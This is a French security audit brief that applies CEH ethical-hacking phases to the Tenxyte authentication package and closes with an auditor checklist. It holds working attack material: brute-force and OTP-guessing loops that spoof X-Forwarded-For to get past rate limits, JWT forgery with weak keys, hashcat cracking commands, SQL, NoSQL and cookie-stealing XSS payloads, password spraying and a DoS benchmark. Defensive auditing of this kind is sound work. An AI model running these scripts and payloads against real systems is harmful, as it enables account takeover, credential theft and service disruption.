# Tenxyte — CEH (Certified Ethical Hacker) Concepts Audit Brief

> **Objectif** : fournir toutes les informations nécessaires pour conduire un
> audit éthique de Tenxyte selon les concepts et méthodologies CEH (Certified
> Ethical Hacker — EC-Council). Chaque concept CEH est appliqué à l'architecture
> réelle du package.
> **Date** : 2026-02-28 | **Version** : `0.9.1.7`

---

## PHASE 1 — Reconnaissance (Footprinting & Scanning)

---

### 1.1 Passive Reconnaissance — Informations publiques exposées

| Source | Information exposable | Impact |
|--------|----------------------|--------|
| **PyPI** (`pypi.org/project/tenxyte`) | Version exacte, nom des mainteneurs, date de release | Vérifier si des CVE existent sur cette version |
| **GitHub** (`github.com/tenxyte/tenxyte`) | Structure complète du code, noms des endpoints, structure DB | Surface d'attaque totale visible publicly |
| **ReadTheDocs** (`tenxyte.readthedocs.io`) | Tous les endpoints documentés avec paramètres | Carte complète de la surface d'attaque |
| **Schema OpenAPI** (`/docs/` ou `openapi_schema.json`) | 70+ endpoints, types attendus, headers requis | Inventaire complet pour un attaquant |
| **`git log` public** | Historique de commits — messages de commit pouvant révéler des bugs corrigés | Identifier les vulnérabilités patchées récemment |

**Commandes de footprinting passif :**
```bash
# Version exacte installée (visible via PyPI ou pip show)
pip show tenxyte

# Rechercher des vulnérabilités connues
pip-audit --package tenxyte
searchsploit tenxyte   # Exploit DB

# GitHub dorks
site:github.com "tenxyte" "SECRET_KEY"
site:github.com "tenxyte" ".env"
```

### 1.2 Active Reconnaissance — Scanning des endpoints

**Tenxyte expose les headers suivants dans ses réponses :**

| Header de réponse | Information révélée | CEH concern |
|------------------|--------------------|----|
| Absence de `Server: gunicorn/21.2.0` | Version du serveur (si non supprimé) | Version disclosure |
| `Allow: GET, POST, OPTIONS` | Méthodes HTTP acceptées | Cartographie de l'API |
| `X-Content-Type-Options: nosniff` | SecurityHeadersMiddleware actif → Tenxyte détectable | Fingerprinting |
| `WWW-Authenticate: Bearer` | Mécanisme d'auth JWT détectable | Fingerprinting |

**Scan des endpoints :**
```bash
# Enumération des endpoints (via schema public)
curl -s https://target/api/v1/docs/ | python -m json.tool

# Test de présence de l'API Tenxyte (fingerprinting)
curl -s -o /dev/null -w "%{http_code}" https://target/api/v1/
# → 200 si Tenxyte, avec header X-Content-Type-Options = Tenxyte détecté

# Try common endpoints
for ep in login register health docs 2fa magiclink; do
  curl -s -o /dev/null -w "$ep: %{http_code}\n" https://target/api/v1/$ep/
done
```

### 1.3 Enumération des utilisateurs

| Vector | Mécanisme | Mitigation Tenxyte |
|--------|----------|-------------------|
| `POST /login/email/` — email inexistant | Même message `"Invalid credentials"` | ✅ Anti-énumération |
| `POST /password/reset/request/` | 200 OK peu importe l'email | ✅ Anti-énumération |
| `POST /register/` — email déjà pris | `{"email": ["user with this email already exists"]}` | ⚠️ **Confirme qu'un email existe** |
| Timing attack sur `/login/email/` | bcrypt s'exécute seulement si user trouvé → délai mesurable | ⚠️ **Énumération temporelle possible** |
| `X-Org-Slug` inexistant | `{"error": "Organization not found"}` | ⚠️ Confirme qu'un org-slug n'existe pas |

**Test de timing attack :**
```python
import time, requests

def measure_login_time(email, password="test"):
    start = time.time()
    requests.post("https://target/api/v1/login/email/",
        json={"email": email, "password": password},
        headers={"X-Access-Key": "...", "X-Access-Secret": "..."})
    return time.time() - start

# Email inexistant → ~5ms (no bcrypt)
# Email existant → ~100ms (bcrypt)
t1 = measure_login_time("nonexistent@example.com")
t2 = measure_login_time("known_user@example.com")
print(f"Timing diff: {abs(t1 - t2)*1000:.0f}ms → email exists: {t2 > 0.05}")
```

---

## PHASE 2 — System Hacking

---

### 2.1 Password Attacks — Vecteurs et mitigations

#### Brute Force / Dictionary Attack

| Vecteur | Rate limit actif | Mitigation |
|---------|----------------|------------|
| `POST /login/email/` | 5/min + 20/h par IP | `LoginThrottle` + `LoginHourlyThrottle` |
| `POST /otp/verify/email/` | 5/min par IP | `OTPVerifyThrottle` |
| `POST /magic-link/verify/` | 10/min par IP | `MagicLinkVerifyThrottle` |
| `POST /password/reset/confirm/` | 3/h par IP | `PasswordResetThrottle` |

**Bypass du rate limiting — via X-Forwarded-For spoofing :**
```python
# Tous les throttles Tenxyte lisent X-Forwarded-For sans validation
# Un attaquant peut forger l'IP source pour contourner le rate limit

import requests

def brute_force_bypass(email, wordlist):
    for i, password in enumerate(wordlist):
        # Changer l'IP forgée à chaque requête
        fake_ip = f"192.168.{i//255}.{i%255}"
        requests.post("https://target/api/v1/login/email/",
            json={"email": email, "password": password},
            headers={
                "X-Access-Key": "...",
                "X-Access-Secret": "...",
                "X-Forwarded-For": fake_ip  # Bypass rate limit
            })
```

> **Impact critique** : si le reverse proxy transmet `X-Forwarded-For` sans
> validation, ce bypass est totalement fonctionnel. L'account lockout
> (`TENXYTE_ACCOUNT_LOCKOUT_ENABLED`) reste efficace car basé sur le compte
> (pas l'IP), mais le rate limiting IP est contournable.

#### Password Spraying

```bash
# Tester 1 mot de passe commun sur N comptes — contourne account lockout
for email in user1@corp.com user2@corp.com user3@corp.com; do
  curl -s -X POST https://target/api/v1/login/email/ \
    -H "X-Access-Key: ..." -H "X-Access-Secret: ..." \
    -d "{\"email\": \"$email\", \"password\": \"Company2024!\"}"
done
```

**Mitigation Tenxyte :** `ProgressiveLoginThrottle` bloque par IP, mais le
password spraying sur différents comptes depuis différentes IPs spoofées
reste possible si `X-Forwarded-For` n'est pas validé.

#### Credential Stuffing

Les refresh tokens **actifs non hackés** dans une DB compromise restent valides.
Chaque refresh token est stocké **en clair** dans `refresh_tokens.token`.

```sql
-- Si un attaquant accède à la DB, il peut utiliser tous les refresh tokens actifs :
SELECT token FROM refresh_tokens WHERE is_revoked = FALSE AND expires_at > NOW();
```

### 2.2 Privilege Escalation

#### Horizontal Privilege Escalation (IDOR)

```
Test : User A peut-il accéder aux données de User B ?

GET /api/v1/users/<user_B_id>/roles/
  Auth: JWT de User A (non-staff)
  Attendu: 403 Forbidden
  À vérifier: est-ce bien 403 ou 200 (IDOR) ?
```

**Endpoints à risque IDOR :**
- `GET /users/<user_id>/roles/` → filtrage par `is_staff` uniquement ?
- `GET /admin/audit-logs/` → filtrage par user courant ou tous les logs ?
- `DELETE /webauthn/credentials/<id>/` → filtrage par `user=request.user` ✅ (protégé)
- `GET /ai/tokens/<pk>/` → filtrage par `user=request.user` à vérifier

#### Vertical Privilege Escalation (Mass Assignment)

```python
# Test : un user non-staff peut-il s'auto-promouvoir via PATCH /me/?
import requests
response = requests.patch(
    "https://target/api/v1/me/",
    json={
        "first_name": "hacker",
        "is_staff": True,       # Tentative mass assignment
        "is_superuser": True,   # Tentative mass assignment
        "is_banned": False,     # Tentative mass assignment
    },
    headers={"Authorization": "Bearer <user_jwt>", ...}
)
# Attendu: 200 OK mais SANS changement de is_staff/is_superuser
# Vérifier le serializer UpdateUserSerializer pour s'assurer que ces
# champs sont dans 'read_only_fields'
```

#### Escalade via JWT Forgery

```python
import jwt

# Test 1 : alg:none (attaque classique)
token = jwt.encode(
    {"user_id": "admin_uuid", "type": "access", "jti": "xxx", "app_id": "yyy"},
    key="",
    algorithm="none"
)
# Tenxyte : algorithms=["HS256"] → REJET ✅

# Test 2 : forger avec une clé faible ou devinée
# Si SECRET_KEY Django est faible, il peut être cracké
# hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt

# Test 3 : utiliser un token expiré (replay)
# Tenxyte vérifie exp → REJET ✅

# Test 4 : utiliser un token blacklisté
# Tenxyte vérifie JTI dans BlacklistedToken → REJET ✅
```

### 2.3 Maintaining Access (Post-exploitation)

| Technique CEH | Applicabilité à Tenxyte | Vecteur |
|--------------|------------------------|---------|
| **Backdoor via AgentToken** | ⚠️ Applicable | Un attaquant avec accès `is_staff` peut créer un AgentToken de longue durée |
| **Refresh token persistence** | ⚠️ Applicable | Refresh token non révoqué survive même si le mot de passe change (à vérifier) |
| **Nouvelle application cliente** | ⚠️ Applicable | Avec accès `is_staff`, créer une application pour maintenir l'accès |
| **Compte utilisateur persistant** | ⚠️ Standard | Un compte créé survive à un changement de `SECRET_KEY` JWT |

**Test : le refresh token survit-il à un changement de mot de passe ?**
```python
# Scénario : attaquant obtient un refresh token → victime change son mot de passe
# Question : le refresh token est-il révoqué lors du password_change ?

# Dans le code : password_change_service.py → à vérifier si
# RefreshToken.objects.filter(user=user).update(is_revoked=True) est appelé
```

### 2.4 Covering Tracks — Effacement des traces

**Mécanismes de traçabilité que l'attaquant doit effacer :**

| Trace laissée | Localisation | Effacement possible ? |
|--------------|--------------|----------------------|
| `AuditLog` entries | Table `audit_logs` | ❌ Pas d'endpoint DELETE pour AuditLog (is_staff only GET) |
| `LoginAttempt` | Table `login_attempts` | ❌ Pas d'endpoint de suppression |
| `BlacklistedToken` | Table `blacklisted_tokens` | ❌ Cleanup only via management command |
| Logs serveur (access.log) | Serveur WSGI | ❌ Hors Tenxyte — responsabilité infrastructure |

> **Point positif CEH** : Tenxyte ne fournit aucun endpoint permettant à un
> attaquant de supprimer les `AuditLog` via l'API. La suppression des traces
> nécessite un accès DB direct, ce qui implique une compromission plus profonde.

---

## PHASE 3 — Network Attacks

---

### 3.1 Man-in-the-Middle (MitM)

**Tenxyte ne gère pas TLS directement.** Vecteurs de MitM :

| Vecteur | Impact | Mitigation |
|---------|--------|-----------|
| Interception HTTP (HTTPS non forcé) | Tokens JWT + X-Access-Secret en clair | HSTS via `SecurityHeadersMiddleware` (configurable) |
| SSL Stripping | Downgrade vers HTTP | HSTS `preload` (configurable mais absent par défaut) |
| Interception JWT | Token valide intercepté → accès complet | TTL court (15min en `medium`, 5min en `robust`) |
| Interception X-Access-Secret | Secret bcrypt hashé → accès pour toutes les requêtes de l'app | Rotation via `/applications/<id>/regenerate/` |

**Test réseau :**
```bash
# Vérifier que l'API n'est accessible qu'en HTTPS
curl -v http://target/api/v1/login/email/
# Attendu: 301 Redirect vers HTTPS

# Vérifier HSTS
curl -I https://target/api/v1/login/email/ | grep Strict-Transport
# Attendu: Strict-Transport-Security: max-age=31536000...
```

### 3.2 Session Hijacking

**Sessions Tenxyte = JWT + Refresh Token**

| Vecteur de hijacking | Mécanisme | Défense |
|---------------------|----------|---------|
| Vol du JWT en transit | Headers HTTP interceptés | TLS + courte durée de vie |
| Vol du JWT in browser (XSS) | `localStorage` ou cookie non `httpOnly` | Responsabilité de l'application hôte |
| Vol du refresh token | `localStorage` ou DB compromise | Token en clair en DB ⚠️ |
| Cookie theft via CSRF | Si mode cookie activé | Tenxyte utilise Bearer par défaut (pas de cookie) |
| Logout non propagé | Token invalide après logout | Blacklist JTI ✅ |

### 3.3 Denial of Service (DoS)

| Vecteur DoS | Mécanisme | Mitigation Tenxyte |
|------------|----------|--------------------|
| **bcrypt CPU exhaustion** | `POST /login/email/` avec mot de passe valide déclenche bcrypt (~100ms CPU) | Rate limiting 5/min |
| **bcrypt via X-Access-Secret** | Chaque requête → `bcrypt.checkpw()` sur l'app secret | Pas de cache → vecteur DDoS applicatif |
| **Registration flood** | `POST /register/` crée des entrées DB | 3/h + 10/j par IP |
| **OTP flood** | `POST /otp/request/` déclenche envoi SMS/email | 5/h par IP |
| **Password history flood** | Créer de nombreux changements de MDP | Rate limiting implicite via login |
| **AuditLog growth** | Actions légitimes → log growth illimité | Nettoyage manuel uniquement |

```bash
# Test DoS basique via bcrypt (si rate limiting bypassé)
# Chaque requête = ~100ms CPU serveur
ab -n 1000 -c 50 \
   -H "X-Access-Key: valid_key" \
   -H "X-Access-Secret: valid_secret" \
   -p login.json \
   https://target/api/v1/login/email/
```

---

## PHASE 4 — Web Application Hacking

---

### 4.1 SQL Injection

**Tenxyte utilise exclusivement l'ORM Django.** Résistance élevée.

```python
# Test payload dans tous les champs string
payloads = [
    "' OR '1'='1",
    "admin@test.com'; DROP TABLE users; --",
    "' UNION SELECT * FROM users--",
    "1; SELECT pg_sleep(5)--",       # Time-based SQLi test
    "\\x00",                          # Null byte injection
]

# Résultat attendu : 400 (validation), 401 (auth), ou 429 (rate limit)
# Jamais 500 Internal Server Error
```

**Vérification MongoDB** (si `[mongodb]` extra installé) :
```python
# NoSQL injection dans les paramètres MongoDB
{"email": {"$gt": ""}}          # Bypass auth MongoDB
{"email": {"$regex": ".*"}}     # RegEx injection
# Tenxyte utilise django-mongodb-backend qui paramétrise → protégé
```

### 4.2 Cross-Site Scripting (XSS)

Tenxyte est une **API JSON pure** — pas de rendu HTML serveur.

| Champ | Stockage du payload | XSS serveur ? | XSS client ? |
|-------|--------------------|----|---|
| `first_name` | Stocké en brut en DB | ❌ API JSON | ⚠️ Si l'app hôte affiche sans échappement |
| `last_name` | Idem | ❌ | ⚠️ |
| `email` | Idem | ❌ | ⚠️ |
| `audit_logs.details` | JSON libre | ❌ | ⚠️ Si admin frontend non protégé |

**Test stocké XSS :**
```python
requests.post("https://target/api/v1/register/", json={
    "email": "test@example.com",
    "password": "Valid1234!",
    "first_name": "<script>document.cookie='stolen='+document.cookie</script>",
    "last_name": "<img src=x onerror=alert(1)>"
})
# Attended: 201 Created (stocké en brut — pas de rendu serveur)
# L'application hôte DOIT échapper ces valeurs avant affichage HTML
```

### 4.3 Cross-Site Request Forgery (CSRF)

Tenxyte utilise des tokens **Bearer JWT dans les headers** — non vulnérable au
CSRF natif (les navigateurs n'envoient pas automatiquement les Authorization headers).

| Condition | Vulnérabilité CSRF |
|-----------|-------------------|
| API Bearer JWT dans header | ✅ Non vulnérable (CSRF ne peut pas forger des headers custom) |
| Si l'intégrateur utilise des cookies | ⚠️ CSRF nécessite alors `SameSite=Strict` ou CSRF token |
| `X-Access-Key` en header | ✅ Non vulnérable |

### 4.4 Server-Side Request Forgery (SSRF)

**Aucun endpoint Tenxyte n'accepte une URL fournie par l'utilisateur comme destination de requête HTTP.** Toutes les URLs d'appel externe sont des constantes hardcodées :

```python
# social_auth_service.py — URLs statiques
GOOGLE_TOKEN_URL = "https://oauth2.googleapis.com/token"      # Constante
GITHUB_USER_URL  = "https://api.github.com/user"              # Constante
HIBP_URL         = "https://api.pwnedpasswords.com/range/{}"  # Format string avec hash 5 chars

# → Aucun SSRF possible via l'API Tenxyte
```

### 4.5 Insecure Direct Object References (IDOR)

**Endpoints à tester en priorité :**

```bash
# Test IDOR 1 : un user non-staff peut-il lire les données d'un autre user ?
curl https://target/api/v1/users/<OTHER_USER_UUID>/roles/ \
     -H "Authorization: Bearer <MY_JWT>"
# Attendu : 403

# Test IDOR 2 : un user peut-il accéder au refresh token d'un autre ?
curl https://target/api/v1/admin/refresh-tokens/<TOKEN_ID>/ \
     -H "Authorization: Bearer <MY_JWT>"
# Attendu : 403 (is_staff requis)

# Test IDOR 3 : un user peut-il supprimer les credentials WebAuthn d'un autre ?
curl -X DELETE https://target/api/v1/webauthn/credentials/<CRED_ID>/ \
     -H "Authorization: Bearer <MY_JWT>"
# Attendu : 404 ou 403 (filtrage par user=request.user)

# Test IDOR 4 : accès aux logs d'audit d'un autre user
curl https://target/api/v1/admin/audit-logs/?user_id=<OTHER_USER_UUID> \
     -H "Authorization: Bearer <MY_JWT>"
# Attendu : 403 (is_staff requis)
```

### 4.6 Broken Authentication — Tests CEH

```bash
# Test 1 : replay d'un token révoqué (après /logout/)
TOKEN=$(curl -s -X POST .../login/email/ | jq -r .access_token)
curl -X POST .../logout/ -H "Authorization: Bearer $TOKEN"
curl .../me/ -H "Authorization: Bearer $TOKEN"
# Attendu : 401 (token blacklisté)

# Test 2 : refresh token après logout global
REFRESH=$(curl -s -X POST .../login/email/ | jq -r .refresh_token)
curl -X POST .../logout/all/ -H "Authorization: Bearer $ACCESS"
curl -X POST .../refresh/ -d "{\"refresh_token\": \"$REFRESH\"}"
# Attendu : 401 (token révoqué)

# Test 3 : réutilisation d'OTP (6 chiffres)
# Utiliser le même code OTP deux fois dans la fenêtre de validité
# Risque : Tenxyte vérifie is_used=True → ✅ protégé pour OTP
# Mais pour TOTP (pyotp.verify) : pas d'anti-replay explicite identifié

# Test 4 : bypass 2FA — soumettre le login sans totp_code
curl -X POST .../login/email/ \
     -d '{"email": "2fa_user@test.com", "password": "Valid1234!"}' ...
# Si 2FA requis : attendu 200 mais avec requires_2fa=True (pas de token JWT complet)
# Vérifier que le JWT final n'est PAS retourné sans le totp_code
```

---

## PHASE 5 — Cryptography Attacks

---

### 5.1 Attaques sur les tokens JWT (HS256)

```python
# Outils CEH pour cracker la clé HMAC-SHA256 d'un JWT
# hashcat -a 0 -m 16500 eyJhbGc... rockyou.txt
# john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt

# Si la SECRET_KEY Django est faible (ex: "secret", "changeme") → crackable
# Exemple de JWT vulnérable : signed avec "secret"
import jwt
forged = jwt.encode(
    {"user_id": "...", "app_id": "...", "type": "access", "jti": "...",
     "iat": 1700000000, "exp": 9999999999},
    "secret",  # Clé faible
    algorithm="HS256"
)
```

**Clés faibles à tester sur le JWT capturé :**
```
secret, password, changeme, django-insecure-xxx, test,
UNSAFE_DEFAULT (valeur fallback Tenxyte si pas de config !)
```

> **⚠️ Risque Tenxyte** : si `TENXYTE_JWT_SECRET_KEY` n'est pas configuré,
> Tenxyte utilise `SECRET_KEY` Django comme fallback. Si Django est configuré
> avec sa valeur par défaut générée (`django-insecure-...`), elle est facilement
> identifiable.

### 5.2 Attaque sur les codes OTP (6 chiffres)

```python
# OTP à 6 chiffres = 10^6 = 1 000 000 possibilités
# Avec le rate limit actuel : 5 tentatives/min → ~138 heures pour brute force complet
# Bypass via X-Forwarded-For : réduit à quelques secondes avec rotations IP

# Test de brute force OTP avec bypass rate limit
import requests, itertools

def brute_force_otp(token_or_context):
    for i in range(1000000):
        code = str(i).zfill(6)
        fake_ip = f"10.0.{i//65536}.{(i//256)%256}"
        r = requests.post(".../otp/verify/email/",
            json={"code": code},
            headers={"X-Forwarded-For": fake_ip, ...})
        if r.status_code == 200:
            print(f"OTP found: {code}")
            break
```

### 5.3 Attaque sur les codes backup 2FA (8 chars)

Les codes backup sont stockés comme SHA-256 hashés en DB.

```python
# Structure : codes aléatoires 8 chars (alphabet alphanum) = 36^8 ≈ 2^41
# Avec GPU : hashcat peut tester ~10^9 SHA-256/sec → 2^41 / 10^9 ≈ ~2000 secondes
# PAS de sel par code → attaque par lookup table partielle possible

# hashcat -a 3 -m 1400 <sha256_hash> ?a?a?a?a?a?a?a?a
# (8 chars alphanumériques)
```

> **Mitigation** : le sel par utilisateur (`totp_secret` distinct) rendrait cette
> attaque infaisable. Mais les backup codes eux-mêmes ne sont pas salés avec un
> sel unique par code — à vérifier dans `totp_service.py`.

### 5.4 Timing Attacks

| Comparaison | Méthode | Résistance timing |
|------------|---------|-----------------|
| `access_secret` applicatif | `bcrypt.checkpw()` | ✅ Constant time (bcrypt) |
| Token OTP | `self.code == self._hash_code(code)` | ⚠️ Python `==` sur str (non constant) |
| Backup codes | `code_hash in user.backup_codes` | ⚠️ Python `in` (non constant) |
| JWT signature | `PyJWT` (HMAC-SHA256) | ✅ Constant time (hmac.compare_digest) |
| Refresh token | Lookup DB par valeur exacte | ✅ DB fait la comparaison |

---

## PHASE 6 — Social Engineering & OAuth Attacks

---

### 6.1 Phishing via Magic Link

```
Vecteur : un attaquant envoie un faux magic link à la victime.

Flux d'attaque :
1. Attaquant initie POST /magic-link/request/ avec l'email de la victime
2. La victime reçoit un email légitime de l'application avec le magic link
3. L'attaquant surveille le lien (si réseau contrôlé) → vole le token

Mitigation Tenxyte :
- Token CSPRNG 32 chars → énorme entropie (256 bits) → non guessable
- TTL 15 min → fenêtre courte
- Token à usage unique (is_used=True)

Mais : l'email contient le token en query param → risque Referer header
si l'email HTML contient des liens vers des ressources tierces (images tracking)
```

### 6.2 OAuth Account Takeover (Fusion non consentie)

```python
# Scénario : victime a un compte email@company.com créé avec mot de passe
# L'attaquant crée un compte Google OAuth avec le même email (non vérifié)

# Résultat dans Tenxyte :
# SocialAuthService.authenticate() → cherche par email →
# FUSION AUTOMATIQUE sans confirmation explicite →
# L'attaquant accède au compte de la victime

# Facteur limitant : Google, Microsoft marquent email_verified=True
# GitHub peut retourner des emails non vérifiés comme email primaire
```

### 6.3 Agent Token Abuse (AIRS)

```python
# Scénario : un agent IA "honnête" se fait compromettre → ses tokens sont volés

# Si un attaquant obtient un AgentToken (48 chars) :
# → Il peut effectuer TOUTES les actions autorisées pour cet agent
# → Contrairement au JWT, l'AgentToken ne fait PAS de re-vérification de l'IP
# → L'attaquant peut agir "au nom de" l'humain délégant

# Vecteur d'exfiltration : si l'agent IA log ses tokens dans un fichier de debug
# ou dans ses propres logs LLM → compromission via les logs de l'IA
```

---

## PHASE 7 — Checkliste CEH finale pour l'auditeur

---

### Phase 1 — Reconnaissance
- [ ] Scanner tous les endpoints via le schema OpenAPI exposé
- [ ] Vérifier la version Tenxyte installée via `pip show` ou headers
- [ ] Mesurer les timings login (email existant vs inexistant) — differential timing
- [ ] Tester la réponse de `POST /register/` avec un email connu — user enumeration
- [ ] Footprinting GitHub : commits récents avec mots clés "fix", "security", "vulnerability"

### Phase 2 — System Hacking
- [ ] Tester bypass rate limiting via `X-Forwarded-For` spoofing
- [ ] Vérifier mass assignment sur `PATCH /me/` (champs `is_staff`, `is_superuser`)
- [ ] Vérifier IDOR sur `/users/<id>/`, `/ai/tokens/<id>/`, `/admin/audit-logs/`
- [ ] Cracker la clé JWT avec hashcat si une faible valeur est suspectée
- [ ] Vérifier si le refresh token survit à un changement de mot de passe
- [ ] Tester TOTP replay (même code deux fois dans la fenêtre de 30s)

### Phase 3 — Network Attacks
- [ ] Vérifier que HTTP → HTTPS redirect est en place (code 301)
- [ ] Vérifier HSTS présent et `max-age` suffisant (≥ 365 jours)
- [ ] Tester si `X-Access-Secret` est loggué dans les access logs du proxy
- [ ] Vérifier les timings des réponses pour un DoS via bcrypt flooding

### Phase 4 — Web Application
- [ ] Injecter des payloads SQL dans tous les champs string via l'API
- [ ] Injecter des payloads XSS dans `first_name`, `last_name`
- [ ] Tester SSRF via les endpoints OAuth (URL redirect_uri)
- [ ] Tester le bypass 2FA (login avec bon email/password mais sans totp_code)
- [ ] Tester le rejeu d'un token magic link après utilisation

### Phase 5 — Cryptographie
- [ ] Identifier la valeur par défaut de `TENXYTE_JWT_SECRET_KEY`
- [ ] Tenter de cracker le JWT avec des clés communes (rockyou, `UNSAFE_DEFAULT`)
- [ ] Tenter une timing attack sur la vérification d'OTP (comparer délais)
- [ ] Vérifier si les backup codes sont salés individuellement

### Phase 6 — Social Engineering
- [ ] Tester la fusion de compte OAuth avec un email correspondant à un compte existant
- [ ] Inspecter les headers Referer dans les emails magic link (token leak)
- [ ] Vérifier que les agents AIRS ne peuvent pas s'auto-créer d'autres agents

---

## ANNEXE — Informations codebase pour l'auditeur CEH

### Fichiers clés à auditer

| Fichier | Pertinence CEH |
|---------|--------------|
| `src/tenxyte/throttles.py` | Rate limiting — résistance brute force |
| `src/tenxyte/decorators.py` | Access control — privilege escalation |
| `src/tenxyte/middleware.py` | X-Forwarded-For — session hijacking |
| `src/tenxyte/services/jwt_service.py` | JWT forgery — crypto attacks |
| `src/tenxyte/services/auth_service.py` | Authentication logic — bypass attacks |
| `src/tenxyte/services/social_auth_service.py` | OAuth account takeover |
| `src/tenxyte/services/totp_service.py` | 2FA bypass — TOTP replay |
| `src/tenxyte/services/breach_check_service.py` | k-anonymity HIBP |
| `src/tenxyte/models/operational.py` | OTPCode, RefreshToken en clair |
| `src/tenxyte/models/agent.py` | AgentToken en clair, HITL |
| `tests/security/test_security.py` | Attaques déjà testées |

### Informations sur la gestion des tokens

| Token | Longueur | Entropie | Algorithme | Stockage |
|-------|---------|---------|-----------|---------|
| JWT access | Variable (HS256) | N/A | HMAC-SHA256 | En transit uniquement |
| Refresh token | 64 chars base64url | ~384 bits | CSPRNG | En clair en DB |
| OTP (email/SMS) | 6 chiffres | ~20 bits | CSPRNG | SHA-256 en DB |
| Magic link | 32 chars | ~256 bits | CSPRNG | SHA-256 en DB |
| Backup code | 8 chars alphanum | ~41 bits | CSPRNG | SHA-256 en DB (non salé) |
| WebAuthn challenge | 32 bytes | ~256 bits | CSPRNG | En brut en DB (5min TTL) |
| Agent token | 48 chars alphanum | ~302 bits | CSPRNG | En clair en DB |
| OTP code reset | 6 chiffres | ~20 bits | CSPRNG | SHA-256 en DB |
